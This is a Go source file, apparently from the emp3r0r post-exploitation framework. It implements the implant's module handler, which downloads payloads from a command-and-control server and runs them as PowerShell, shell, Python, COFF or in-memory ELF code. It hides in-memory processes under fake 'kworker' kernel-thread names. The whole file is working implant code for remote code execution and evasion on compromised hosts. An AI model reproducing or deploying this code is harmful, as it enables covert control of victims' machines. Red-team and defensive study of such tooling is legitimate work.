package modules

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"time"

	"github.com/jm33-m0/emp3r0r/core/lib/logging"

	"github.com/jm33-m0/arc/v2"
	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/agentutils"
	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/c2transport"
	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/common"
	"github.com/jm33-m0/emp3r0r/core/internal/def"
	"github.com/jm33-m0/emp3r0r/core/lib/crypto"
	"github.com/jm33-m0/emp3r0r/core/lib/exeutil"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
)

// ModuleHandler downloads and runs modules from C2 using resolved, typed invocation data
func ModuleHandler(download_addr, file_to_download, payload_type, modName, checksum string, invocation def.ResolvedInvocation, inMem bool) (out string) {
	tarball := filepath.Join(common.RuntimeConfig.AgentRoot, modName+".tar.xz")
	modDir := filepath.Join(common.RuntimeConfig.AgentRoot, modName)
	var err error

	if payload_type == "coff" && !inMem {
		return logging.Sprintf("COFF modules must run in memory; set in_memory=true in agent_config")
	}

	// download and verify module file
	payload_data_downloaded, downloadErr := downloadAndVerifyModule(file_to_download, checksum, download_addr)
	if downloadErr != nil {
		return downloadErr.Error()
	}
	payload_data := payload_data_downloaded

	if inMem {
		// in memory execution
		payload_data, err = arc.DecompressXz(payload_data_downloaded)
		if err != nil {
			return logging.Sprintf("decompressing %s: %v", file_to_download, err)
		}
	} else {
		// on disk execution
		if err := prepareModuleOnDisk(tarball, modDir, payload_data); err != nil {
			return err.Error()
		}
	}

	// switch on payload type, in memory execution
	switch payload_type {
	case "powershell":
		out, err := agentutils.ExecutePowerShell(payload_data, invocation.Argv, nil)
		if err != nil {
			return logging.Sprintf("running powershell script: %s (%v)", out, err)
		}
		return out
	case "bash":
		out, err := agentutils.ExecuteShell(payload_data, invocation.Argv, nil)
		if err != nil {
			return logging.Sprintf("running shell script: %s (%v)", out, err)
		}
		return out
	case "python":
		if inMem {
			out, err := agentutils.ExecutePython(payload_data, invocation.Argv, nil)
			if err != nil {
				return logging.Sprintf("running python script: %s (%v)", out, err)
			}
			return out
		}
	case "coff":
		out, err := runCOFFModule(payload_data, invocation)
		if err != nil {
			return logging.Sprintf("running COFF module: %v", err)
		}
		return out
	case "elf":
		if inMem {
			outChan := make(chan string)
			go func() {
				randName := fmt.Sprintf("[kworker/%d:%d-events]", util.RandInt(0, 20), util.RandInt(0, 10))
				// if you need to pass arguments to the in-memory module, you can do it in environment variables
				// when implementing the module, you can read the arguments from env
				out, err = exeutil.InMemExeRun(payload_data, []string{randName}, nil)
				if err != nil {
					out = logging.Sprintf("InMemExeRun: %v", err)
				}
				outChan <- logging.Sprintf("Success\n%s", out)
			}()
			select {
			case out = <-outChan:
				return out
			case <-time.After(10 * time.Second):
				out = "Timeout while waiting for in-memory module to print output"
				return out
			}
		}
	}

	// normal on disk modules, run invocation argv
	if !inMem {
		if len(invocation.Argv) == 0 {
			return logging.Sprintf("no argv specified for module %s", modName)
		}
		defer os.Chdir(common.RuntimeConfig.AgentRoot)
		if err = os.Chdir(modDir); err != nil {
			return logging.Sprintf("cd to %s: %v", modDir, err)
		}
		cmd := exec.Command(invocation.Argv[0], invocation.Argv[1:]...)
		if invocation.Stdin != "" {
			cmd.Stdin = strings.NewReader(invocation.Stdin)
		}
		logging.Printf("Running %v", cmd.Args)
		outBytes, runErr := cmd.CombinedOutput()
		out = string(outBytes)
		if runErr != nil {
			return logging.Sprintf("running %v: %s (%v)", cmd.Args, out, runErr)
		}
	}

	return out
}

func prepareModuleOnDisk(tarball, modDir string, payload_data []byte) error {
	// Create agent root if not exist
	if !util.IsDirExist(common.RuntimeConfig.AgentRoot) {
		if err := os.MkdirAll(common.RuntimeConfig.AgentRoot, 0o700); err != nil {
			return fmt.Errorf("creating %s: %v", common.RuntimeConfig.AgentRoot, err)
		}
	}

	// write-to-disk modules
	err := util.WriteFileAgent(tarball, payload_data, 0o600)
	if err != nil {
		return fmt.Errorf("writing %s: %v", tarball, err)
	}

	if extractErr := extractModule(modDir, tarball); extractErr != nil {
		return extractErr
	}

	// cd to module dir
	defer os.Chdir(common.RuntimeConfig.AgentRoot)
	err = os.Chdir(modDir)
	if err != nil {
		return fmt.Errorf("cd to %s: %v", modDir, err)
	}

	return nil
}

func downloadAndVerifyModule(file_to_download, checksum, download_addr string) (data []byte, err error) {
	if crypto.SHA256SumFile(file_to_download) != checksum {
		if data, err = c2transport.FetchFile(download_addr, file_to_download, "", checksum); err != nil {
			return nil, fmt.Errorf("downloading %s: %v", file_to_download, err)
		}
	} else {
		// checksum already matches local file; read it so callers can run in-memory flows
		if data, err = os.ReadFile(file_to_download); err != nil {
			return nil, fmt.Errorf("reading %s: %v", file_to_download, err)
		}
	}

	if crypto.SHA256SumRaw(data) != checksum {
		logging.Print("Checksum failed, restarting...")
		util.TakeABlink()
		os.RemoveAll(file_to_download)
		return downloadAndVerifyModule(file_to_download, checksum, download_addr) // Recursive call
	}
	return data, nil
}

func extractModule(modDir, tarball string) error {
	os.RemoveAll(modDir)
	if err := util.Unarchive(tarball, common.RuntimeConfig.AgentRoot); err != nil {
		return fmt.Errorf("unarchive module tarball: %v", err)
	}

	return processModuleFiles(modDir)
}

func processModuleFiles(modDir string) error {
	files, err := os.ReadDir(modDir)
	if err != nil {
		return fmt.Errorf("processing module files: %v", err)
	}

	for _, f := range files {
		if err := os.Chmod(filepath.Join(modDir, f.Name()), 0o700); err != nil {
			return fmt.Errorf("setting permissions for %s: %v", f.Name(), err)
		}

		libsTarball := filepath.Join(modDir, "libs.tar.xz")
		if util.IsExist(libsTarball) {
			os.RemoveAll(filepath.Join(modDir, "libs"))
			if err := util.Unarchive(libsTarball, modDir); err != nil {
				return fmt.Errorf("unarchive %s: %v", libsTarball, err)
			}
		}
	}
	return nil
}
